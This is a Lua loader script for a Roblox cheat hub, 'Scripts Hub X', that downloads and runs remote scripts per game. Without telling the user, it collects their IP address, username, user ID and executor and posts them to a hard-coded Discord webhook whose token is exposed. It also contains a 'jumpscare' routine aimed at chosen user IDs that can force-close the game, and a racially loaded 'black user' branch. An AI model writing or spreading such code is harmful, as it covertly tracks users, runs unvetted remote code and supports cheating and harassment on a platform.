-- Scripts Hub X | Official Main Script
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 5)
if not playerGui then
    warn("PlayerGui not found after 5 seconds")
    return
end
print("Main script started, PlayerGui found")

-- UserIds
local OwnerUserId = "2341777244"
local PremiumUsers = {
    "5356702370"
}
local StaffUserId = {
    "2784109194", 
    "8342200727",
    "3882788546"
}
local BlackUsers = {
    "1234567890"
}
local JumpscareUsers = {
    "8469418817"
}
local BypassUsers = {
    "2341777244",
    "3882788546"  -- Staff
}

-- Load scripts from GitHub with error handling
local function loadLoadingScreen()
    print("Attempting to load loading screen from GitHub")
    local success, LoadingScreen = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/main/loadingscreen.lua")
        return loadstring(script)()
    end)
    if not success then
        warn("Failed to load loading screen due to server-only API or other error: " .. tostring(LoadingScreen))
        showErrorNotification()
        return false, nil
    end
    if not LoadingScreen or not LoadingScreen.playEntranceAnimations or not LoadingScreen.animateLoadingBar or not LoadingScreen.playExitAnimations or not LoadingScreen.setLoadingText or not LoadingScreen.initialize then
        warn("Loading screen script missing required functions or failed to load")
        showErrorNotification()
        return false, nil
    end
    print("Loading screen loaded successfully")
    return true, LoadingScreen
end

local function loadKeySystem()
    print("Attempting to load key system from GitHub")
    local success, KeySystem = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/main/keysystem.lua")
        return loadstring(script)()
    end)
    if not success then
        warn("Failed to load key system due to server-only API or other error: " .. tostring(KeySystem))
        return false, nil
    end
    if not KeySystem or not KeySystem.ShowKeySystem or not KeySystem.IsKeyVerified or not KeySystem.HideKeySystem then
        warn("Key system missing required functions or failed to load")
        return false, nil
    end
    print("Key system loaded successfully")
    return true, KeySystem
end

local function checkGameSupport()
    print("Checking game support for PlaceID: " .. game.PlaceId)
    local success, Games = pcall(function()
        local script = game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts/refs/heads/main/GameList.lua")
        return loadstring(script)()
    end)
    if not success then
        warn("Failed to load game list due to server-only API or other error: " .. tostring(Games))
        return false, nil
    end
    for PlaceID, Execute in pairs(Games) do
        if PlaceID == game.PlaceId then
            print("Game supported, script URL: " .. Execute)
            return true, Execute
        end
    end
    print("Game not supported")
    return false, nil
end

local function loadGameScript(scriptUrl)
    print("Attempting to load game script from URL: " .. scriptUrl)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(scriptUrl))()
    end)
    if not success then
        warn("Failed to load game script due to server-only API or other error: " .. tostring(result))
        return false
    end
    print("Game script loaded successfully")
    return true
end

local function showErrorNotification()
    print("Showing error notification")
    local success, ErrorNotification = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/errorloadingscreen.lua"))()
    end)
    if not success then
        warn("Failed to load error notification: " .. tostring(ErrorNotification))
    end
end

local function loadBlackUI()
    print("Loading black UI")
    local success, BlackUI = pcall(function()
        return loadstring(game:HttpGet("https://raw.githubusercontent.com/pickletalk/Scripts-Hub-X/refs/heads/main/blackui.lua"))()
    end)
    if not success then
        warn("Failed to load black UI due to server-only API or other error: " .. tostring(BlackUI))
        return false, nil
    end
    print("Black UI loaded successfully")
    return true, BlackUI
end

local function applyBlackSkin()
    print("Applying black skin effect")
    local character = player.Character or player.CharacterAdded:Wait()
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.BrickColor = BrickColor.new("Really black")
        elseif part:IsA("Decal") and part.Name == "face" then
            part.Transparency = 1
        end
    end
end

local function loadBackgroundMusic()
    print("Loading background music")
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://115881128226372"
    sound.Parent = SoundService
    sound.Looped = true
    sound.Volume = 0.5
    local success, err = pcall(function()
        sound:Play()
    end)
    if not success then
        warn("Failed to play background music: " .. tostring(err))
        return nil
    end
    print("Background music loaded and playing")
    return sound
end

local function getPlayerIP()
    print("Attempting to retrieve player IP")
    local success, ipAddress = pcall(function()
        return game:HttpGet("https://api.ipify.org")
    end)
    if success then
        print("IP retrieved: " .. ipAddress)
        return ipAddress
    else
        warn("Failed to retrieve IP: " .. tostring(ipAddress))
        return "Unknown"
    end
end

local function detectExecutor()
    print("Attempting to detect executor")
    local detectedExecutor = "Unknown"
    local env = getfenv(0)
    
    -- Check for common executor signatures
    if typeof(env.delta) == "table" and env.delta.version then
        detectedExecutor = "Delta Executor"
    elseif typeof(env.krnl) == "table" and env.krnl.inject then
        detectedExecutor = "Krnl"
    elseif typeof(env.fluxus) == "function" and env.fluxus() then
        detectedExecutor = "Fluxus"
    elseif typeof(env.hydrogen) == "table" and env.hydrogen.execute then
        detectedExecutor = "Hydrogen"
    elseif typeof(env.syn) == "table" and env.syn.request then
        detectedExecutor = "Synapse X"
    elseif typeof(env.getexecutorname) == "function" then
        local execName = env.getexecutorname()
        if execName and execName ~= "" then
            detectedExecutor = execName
        end
    elseif typeof(env.isexecutor) == "function" and env.isexecutor() then
        detectedExecutor = "Generic Executor"
    end
    
    print("Detected executor: " .. detectedExecutor)
    return detectedExecutor
end

local function sendWebhookNotification(userStatus, scriptUrl)
    print("Sending webhook notification")
    local webhookUrl = "https://discord.com/api/webhooks/1396650841045209169/Mx_0dcjOVnzp5f5zMhYM2uOBCPGt9SPr908shfLh_FGKZJ5eFc4tMsiiNNp1CGDx_M21"
    if webhookUrl == "" then
        warn("Webhook URL is empty")
        return
    end
    local gameName = "Unknown"
    local success, productInfo = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success then
        gameName = productInfo.Name
    end
    local userId = tostring(player.UserId)
    local ipAddress = "Bypassed"
    if not table.find(BypassUsers, userId) then
        ipAddress = getPlayerIP()
    end
    local detectedExecutor = detectExecutor()
    local send_data = {
        ["username"] = "Script Execution Log",
        ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
        ["content"] = "Scripts Hub X | Official - Logging",
        ["embeds"] = {
            {
                ["title"] = "Script Execution Details",
                ["description"] = "**Game**: " .. gameName .. "\n**Game ID**: " .. game.PlaceId .. "\n**Profile**: https://www.roblox.com/users/" .. player.UserId .. "/profile",
                ["color"] = 4915083,
                ["fields"] = {
                    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
                    {["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true},
                    {["name"] = "Executor", ["value"] = detectedExecutor, ["inline"] = true},
                    {["name"] = "User Type", ["value"] = userStatus, ["inline"] = true},
                    {["name"] = "IP Address", ["value"] = ipAddress, ["inline"] = true},
                    {["name"] = "Script Raw URL", ["value"] = scriptUrl or "N/A", ["inline"] = true}
                },
                ["footer"] = {["text"] = "Scripts Hub X | Official", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
                ["thumbnail"] = {["url"] = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true"}
            }
        }
    }
    local headers = {["Content-Type"] = "application/json"}
    local success, err = pcall(function()
        request({
            Url = webhookUrl,
            Method = "POST",
            Headers = headers,
            Body = HttpService:JSONEncode(send_data)
        })
    end)
    if not success then
        warn("Failed to send webhook notification: " .. tostring(err))
    else
        print("Webhook notification sent successfully")
    end
end

local function checkPremiumUser()
    local userId = tostring(player.UserId)
    print("Checking user status for UserId: " .. userId)
    if OwnerUserId and userId == tostring(OwnerUserId) then
        print("Owner detected")
        return "owner"
    elseif StaffUserId and table.find(StaffUserId, userId) then
        print("Staff detected")
        return "staff"
    elseif BlackUsers and table.find(BlackUsers, userId) then
        print("Black user detected")
        return "blackuser"
    elseif JumpscareUsers and table.find(JumpscareUsers, userId) then
        print("Jumpscare user detected")
        return "jumpscareuser"
    elseif PremiumUsers and table.find(PremiumUsers, userId) then
        print("Premium user verified")
        return "premium"
    end
    print("Non-premium user")
    return "non-premium"
end

-- Main execution
coroutine.wrap(function()
    print("Starting main execution at " .. os.date("%H:%M:%S"))
    local isSupported, scriptUrl = checkGameSupport()
    if not isSupported then
        print("Game not supported")
        local success, LoadingScreen = loadLoadingScreen()
        if success then
            pcall(function()
                LoadingScreen.initialize()
                LoadingScreen.setLoadingText("Game not supported", Color3.fromRGB(245, 100, 100))
                wait(3)
                LoadingScreen.playExitAnimations()
            end)
        end
        showErrorNotification()
        return
    end

    local userStatus = checkPremiumUser()
    sendWebhookNotification(userStatus, scriptUrl)

    if userStatus == "owner" then
        print("Owner detected, loading script directly")
        local scriptLoaded = loadGameScript(scriptUrl)
        if scriptLoaded then
            print("Scripts Hub X | Loading Complete for owner!")
        else
            showErrorNotification()
        end
    elseif userStatus == "staff" then
        print("Staff detected, loading script directly")
        local scriptLoaded = loadGameScript(scriptUrl)
        if scriptLoaded then
            print("Scripts Hub X | Loading Complete for staff!")
        else
            showErrorNotification()
        end
    elseif userStatus == "blackuser" then
        print("Black user detected")
        applyBlackSkin()
        local success, BlackUI = loadBlackUI()
        if success then
            pcall(function()
                BlackUI.showBlackUI()
                wait(3)
                BlackUI.hideBlackUI()
            end)
        end
        local backgroundMusic = loadBackgroundMusic()
        local success, LoadingScreen = loadLoadingScreen()
        if success then
            pcall(function()
                LoadingScreen.initialize()
                LoadingScreen.setLoadingText("Black User Detected", Color3.fromRGB(0, 0, 0))
                wait(2)
                LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180, 200))
                LoadingScreen.animateLoadingBar(function()
                    LoadingScreen.playExitAnimations(function()
                        if backgroundMusic then
                            backgroundMusic:Stop()
                            backgroundMusic:Destroy()
                        end
                        local scriptLoaded = loadGameScript(scriptUrl)
                        if scriptLoaded then
                            print("Scripts Hub X | Loading Complete for black user!")
                        else
                            showErrorNotification()
                        end
                    end)
                end)
            end)
        else
            if backgroundMusic then
                backgroundMusic:Stop()
                backgroundMusic:Destroy()
            end
            showErrorNotification()
        end
    elseif userStatus == "jumpscareuser" then
        print("Jumpscare user detected")
        local success, err = pcall(function()
            if getgenv().jumpscare_jeffwuz_loaded and not _G.jumpscarefucking123 then
                warn("Jumpscare already loading")
                return
            end
            getgenv().jumpscare_jeffwuz_loaded = true
            getgenv().Notify = false
            local Notify_Webhook = "https://discord.com/api/webhooks/1390952057296519189/n0SJoYfZq0PD4-vphnZw2d5RTesGZvkLSWm6RX_sBbCZC2QXxVdGQ5q7N338mZ4m9j5E"
            if not getcustomasset then
                game:Shutdown()
                return
            end
            local ScreenGui = Instance.new("ScreenGui")
            ScreenGui.Parent = CoreGui
            ScreenGui.IgnoreGuiInset = true
            ScreenGui.Name = "JeffTheKillerWuzHere"
            local VideoScreen = Instance.new("VideoFrame")
            VideoScreen.Parent = ScreenGui
            VideoScreen.Size = UDim2.new(1, 0, 1, 0)
            writefile("yes.mp4", game:HttpGet("https://github.com/HappyCow91/RobloxScripts/blob/main/Videos/videoplayback.mp4?raw=true"))
            VideoScreen.Video = getcustomasset("yes.mp4")
            VideoScreen.Looped = true
            VideoScreen.Playing = true
            VideoScreen.Volume = 10
            if getgenv().Notify then
                if Notify_Webhook ~= "" then
                    local ThumbnailAPI = game:HttpGet("https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=true")
                    local json = HttpService:JSONDecode(ThumbnailAPI)
                    local avatardata = json.data[1].imageUrl
                    local UserAPI = game:HttpGet("https://users.roproxy.com/v1/users/" .. player.UserId)
                    local json = HttpService:JSONDecode(UserAPI)
                    local DescriptionData = json.description
                    local CreatedData = json.created
                    local send_data = {
                        ["username"] = "Anti Information Leaks",
                        ["avatar_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg",
                        ["content"] = "https://discord.gg/bpsNUH5sVb",
                        ["embeds"] = {
                            {
                                ["title"] = "Scripts Hub X | Official - Protection",
                                ["description"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official",
                                ["color"] = 4915083,
                                ["fields"] = {
                                    {["name"] = "Username", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "Display Name", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "User ID", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "Account Age", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "Membership", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "Account Created Day", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true},
                                    {["name"] = "Profile Description", ["value"] = "THIS IS PROBIHIDENED BY Scripts Hub X | Official", ["inline"] = true}
                                },
                                ["footer"] = {["text"] = "JTK Log", ["icon_url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"},
                                ["thumbnail"] = {["url"] = "https://res.cloudinary.com/dtjjgiitl/image/upload/q_auto:good,f_auto,fl_progressive/v1753332266/kpjl5smuuixc5w2ehn7r.jpg"}
                            }
                        }
                    }
                    request({
                        Url = Notify_Webhook,
                        Method = "POST",
                        Headers = {["Content-Type"] = "application/json"},
                        Body = HttpService:JSONEncode(send_data)
                    })
                end
            end
            wait(5)
            ScreenGui:Destroy()
        end)
        if not success then
            warn("Jumpscare script failed: " .. tostring(err))
        end
        local success, LoadingScreen = loadLoadingScreen()
        if success then
            pcall(function()
                LoadingScreen.initialize()
                LoadingScreen.setLoadingText("Jumpscare User Detected", Color3.fromRGB(255, 0, 0))
                wait(2)
                LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180, 200))
                LoadingScreen.animateLoadingBar(function()
                    LoadingScreen.playExitAnimations(function()
                        local scriptLoaded = loadGameScript(scriptUrl)
                        if scriptLoaded then
                            print("Scripts Hub X | Loading Complete for jumpscare user!")
                        else
                            showErrorNotification()
                        end
                    end)
                end)
            end)
        else
            showErrorNotification()
        end
    else
        print("Non-premium, loading key system")
        local successKS, KeySystem = loadKeySystem()
        local successLS, LoadingScreen = loadLoadingScreen()
        if not successKS or not KeySystem then
            print("Failed to load key system")
            if successLS then
                pcall(function()
                    LoadingScreen.initialize()
                    LoadingScreen.setLoadingText("Failed to load key system", Color3.fromRGB(245, 100, 100))
                    wait(3)
                    LoadingScreen.playExitAnimations()
                end)
            end
            showErrorNotification()
            return
        end
        local keyVerified = false
        pcall(function()
            KeySystem.ShowKeySystem()
            print("Waiting for key verification")
            local startTime = tick()
            while not KeySystem.IsKeyVerified() do
                wait(0.1)
                if tick() - startTime > 20 then
                    warn("Key verification timed out")
                    KeySystem.HideKeySystem()
                    loadLoadingScreen()
                    wait(3.2)
                    loadGameScript(scriptUrl)
                    break
                end
            end
            keyVerified = KeySystem.IsKeyVerified()
            KeySystem.HideKeySystem()
        end)
        if not keyVerified then
            if successLS then
                pcall(function()
                    LoadingScreen.initialize()
                    LoadingScreen.setLoadingText("Key verification failed or timed out", Color3.fromRGB(245, 100, 100))
                    wait(3)
                    LoadingScreen.playExitAnimations()
                end)
            end
            return
        end
        print("Key verified")
        if successLS then
            pcall(function()
                LoadingScreen.initialize()
                LoadingScreen.setLoadingText(userStatus == "premium" and "Premium User Verified" or "Key Verified", Color3.fromRGB(0, 150, 0))
                wait(2)
                LoadingScreen.setLoadingText("Loading game...", Color3.fromRGB(150, 180, 200))
                LoadingScreen.animateLoadingBar(function()
                    LoadingScreen.playExitAnimations(function()
                        local scriptLoaded = loadGameScript(scriptUrl)
                        if scriptLoaded then
                            print("Scripts Hub X | Loading Complete for " .. userStatus .. " user!")
                        else
                            showErrorNotification()
                        end
                    end)
                end)
            end)
        else
            loadGameScript(scriptUrl)
        end
    end
end)()
